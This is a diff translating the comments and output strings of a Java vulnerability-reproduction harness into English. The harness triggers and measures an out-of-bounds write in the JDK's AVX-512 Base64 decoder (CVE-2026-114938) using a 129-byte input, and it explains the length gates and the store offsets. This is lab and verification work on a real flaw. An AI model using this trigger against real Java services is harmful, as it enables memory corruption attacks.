@@ -6,26 +6,27 @@ import java.util.List;
 import java.util.Locale;
 
 /**
- * j4s-oracle - oraculo de corrupcao para CVE-2026-114938.
+ * j4s-oracle - corruption oracle for CVE-2026-114938.
  *
- * Autor do harness: eduxcode (github.com/eduxcode)
- * Primitiva do gatilho: Quang Luong / Calif.io (advisory publico CVE-2026-114938)
+ * Lab author: eduxcode (github.com/eduxcode)
+ * Trigger primitive: Quang Luong / Calif.io (public advisory CVE-2026-114938)
  *
- * O que este oraculo acrescenta:
+ * What this oracle adds:
  *
- *   1. deriva o comprimento de gatilho que realmente alcanca o stub AVX-512:
- *      o gate do stub e `length > 128`, e a cauda precisa ter 1..3 bytes
- *      (length % 64 em {1,2,3}). Por isso 64+'=' e 128+'=' NAO disparam:
- *      ficam no loop escalar. O gatilho correto e 128+'=' (129 bytes).
- *   2. calcula a janela exata da store: dp = 48 * (length / 64), 64 bytes.
- *   3. calcula o buffer que a JDK aloca: 3*ceil((n+1)/4) - paddings.
- *   4. valida primeiro/ultimo byte e a contagem, em vez de "mudou algo".
+ *   1. derives the trigger length that actually reaches the AVX-512 stub:
+ *      the stub gate is `length > 128`, and the tail must have 1..3 bytes
+ *      (length % 64 in {1,2,3}). That is why 64+'=' and 128+'=' do NOT trigger:
+ *      they stay on the scalar loop. The correct trigger is 128 'A' + '=' (129 bytes).
+ *   2. computes the exact store window: dp = 48 * (length / 64), 64 bytes.
+ *   3. computes the buffer the JDK allocates: 3*ceil((n+1)/4) - paddings.
+ *   4. validates the first/last byte and the count, instead of "something changed".
  *
- * Usa decode(byte[],byte[]) com destino de 8192 bytes: a store acontece no
- * mesmo offset, mas dentro do array, o que permite medir sem crashar a JVM.
+ * Uses decode(byte[],byte[]) with an 8192-byte destination: the store happens at
+ * the same offset, but inside the array, which allows measuring without crashing
+ * the JVM.
  *
- * Um gatilho por JVM: a primeira IllegalArgumentException faz o C2
- * desotimizar decode0; chamadas seguintes caem no loop escalar.
+ * One trigger per JVM: the first IllegalArgumentException makes C2 deoptimize
+ * decode0; later calls fall back to the scalar loop.
  */
 public final class Oracle {
 
@@ -60,7 +61,7 @@ public final class Oracle {
                     for (int k = 0; k < p.length; k++) lengths[k] = Integer.parseInt(p[k].trim());
                 }
                 case "-h", "--help" -> { usage(); return; }
-                default -> { System.err.println("arg desconhecido: " + args[i]); usage(); System.exit(2); }
+                default -> { System.err.println("unknown argument: " + args[i]); usage(); System.exit(2); }
             }
         }
 
@@ -69,20 +70,20 @@ public final class Oracle {
 
         if (!json) {
             System.out.println("=".repeat(70));
-            System.out.printf("  %s v%s  -  oraculo de corrupcao Base64%n", TOOL, VER);
-            System.out.printf("  harness: %s (%s)%n", AUTHOR, GITHUB);
-            System.out.printf("  primitiva: %s%n", UPSTREAM);
+            System.out.printf("  %s v%s  -  Base64 corruption oracle%n", TOOL, VER);
+            System.out.printf("  lab: %s (%s)%n", AUTHOR, GITHUB);
+            System.out.printf("  primitive: %s%n", UPSTREAM);
             System.out.println("=".repeat(70));
             System.out.printf("  runtime : %s%n", rt);
             System.out.printf("  arch    : %s%n", System.getProperty("os.arch"));
             System.out.println(sde
-                    ? "  cpu     : AVX-512 VBMI emulado (Intel SDE) -> caminho vetorizado ativo"
-                    : "  cpu     : tentativa direta no caminho AVX-512 (gate: length > 128)");
+                    ? "  cpu     : AVX-512 VBMI emulated (Intel SDE) -> vectorized path active"
+                    : "  cpu     : direct attempt on the AVX-512 path (gate: length > 128)");
             System.out.println("-".repeat(70));
-            System.out.printf("  aquecendo %d decodes de 192 bytes (compila o intrinsic)...%n", warmup);
+            System.out.printf("  warming up with %d decodes of 192 bytes (compiles the intrinsic)...%n", warmup);
             if (lengths.length > 1) {
-                System.out.println("  AVISO: so o primeiro gatilho por JVM atinge o stub;");
-                System.out.println("         use um processo por comprimento para medir varios.");
+                System.out.println("  WARNING: only the first trigger per JVM reaches the stub;");
+                System.out.println("           use one process per length to measure several.");
             }
         }
 
@@ -96,24 +97,24 @@ public final class Oracle {
 
         if (!json) {
             for (Result r : results) {
-                String win = r.first < 0 ? "nenhuma"
+                String win = r.first < 0 ? "none"
                         : "[" + r.first + "," + r.last + "]";
                 System.out.printf(Locale.ROOT,
-                        "  [%s] %dx'A'+'='  len=%d  buffer=%d  rejeitado=%s%n",
+                        "  [%s] %dx'A'+'='  len=%d  buffer=%d  rejected=%s%n",
                         r.hit ? "HIT" : "---", r.chars, r.inLen, r.bufferLen, r.rejected);
                 System.out.printf(Locale.ROOT,
-                        "        observado=%s  cauda=[%d,%d]  alterados=%d  OOB=%d%n",
+                        "        observed=%s  tail=[%d,%d]  changed=%d  OOB=%d%n",
                         win, r.writeStart, r.writeEnd, r.changed, r.oob);
             }
             System.out.println("-".repeat(70));
             if (anyHit) {
-                System.out.printf("  VEREDITO: CORRUPCAO REPRODUZIDA (%d bytes alem do array)%n",
+                System.out.printf("  VERDICT: CORRUPTION REPRODUCED (%d bytes past the array)%n",
                         results.stream().filter(r -> r.hit).findFirst().get().oob);
-                System.out.println("            store de 64 bytes em dp, buffer alocado pela JDK");
+                System.out.println("           64-byte store at dp, buffer allocated by the JDK");
             } else {
-                System.out.println("  VEREDITO: sem corrupcao com os gatilhos testados");
-                System.out.println("            causas: length <= 128 (loop escalar), host sem");
-                System.out.println("            AVX-512 VBMI, runtime corrigido, ou JIT nao compilou.");
+                System.out.println("  VERDICT: no corruption with the tested triggers");
+                System.out.println("           causes: length <= 128 (scalar loop), host without");
+                System.out.println("           AVX-512 VBMI, patched runtime, or the JIT did not compile.");
             }
             System.out.println("=".repeat(70));
         } else {
@@ -123,7 +124,7 @@ public final class Oracle {
         System.exit(anyHit ? 0 : 3);
     }
 
-    /** Roda um gatilho e mede exatamente onde a store caiu. */
+    /** Runs one trigger and measures exactly where the store landed. */
     static Result attempt(Base64.Decoder dec, int chars) {
         Result r = new Result();
         r.chars = chars;
@@ -131,11 +132,11 @@ public final class Oracle {
 
         int len = r.inLen;
         int paddings = 0;
-        if (len >= 2) { /* gatilho termina em um unico '=' */ paddings = 1; }
+        if (len >= 2) { /* the trigger ends in a single '=' */ paddings = 1; }
         if (paddings == 0 && (len & 3) != 0) paddings = 4 - (len & 3);
         r.bufferLen = 3 * ((len + 3) / 4) - paddings;
 
-        r.writeStart = 48 * (len / 64);                        // dp apos os blocos de 64
+        r.writeStart = 48 * (len / 64);                        // dp after the 64-byte blocks
         r.writeEnd = r.writeStart + 63;
         r.tailExpected = len > 128 && (len & 63) >= 1 && (len & 63) <= 3;
         r.oob = r.writeEnd - (r.bufferLen - 1);
@@ -146,7 +147,7 @@ public final class Oracle {
         try {
             dec.decode(("A".repeat(chars) + "=").getBytes(StandardCharsets.US_ASCII), target);
         } catch (IllegalArgumentException expected) {
-            r.rejected = true;                                 // a JDK rejeita DEPOIS de escrever
+            r.rejected = true;                                 // the JDK rejects AFTER writing
         }
 
         int changed = 0, first = -1, last = -1;
@@ -166,7 +167,7 @@ public final class Oracle {
         return r;
     }
 
-    /** length > 128 para o stub escolher AVX-512 (o gate e `cmpl(length,128)`). */
+    /** length > 128 so the stub picks AVX-512 (the gate is `cmpl(length,128)`). */
     static void warm(Base64.Decoder dec, int iters) {
         byte[] valid = "A".repeat(192).getBytes(StandardCharsets.US_ASCII);
         byte[] out = new byte[TARGET_SIZE];
@@ -205,13 +206,13 @@ public final class Oracle {
 
     static void usage() {
         System.out.println("""
-            uso: java Oracle [--lengths 129] [--warmup N] [--json]
+            usage: java Oracle [--lengths 129] [--warmup N] [--json]
 
-              --lengths  quantidade de 'A' antes do '=' (default 128 -> 129 bytes)
-              --warmup   iteracoes de aquecimento (default 200000)
-              --json     saida legivel por maquina
+              --lengths  number of 'A' before the '=' (default 128 -> 129 bytes)
+              --warmup   warmup iterations (default 200000)
+              --json     machine-readable output
 
-            um gatilho por JVM. saida: 0 = corrupcao | 3 = nao reproduzida | 2 = erro
+            one trigger per JVM. exit: 0 = corruption | 3 = not reproduced | 2 = error
             """);
     }
 }
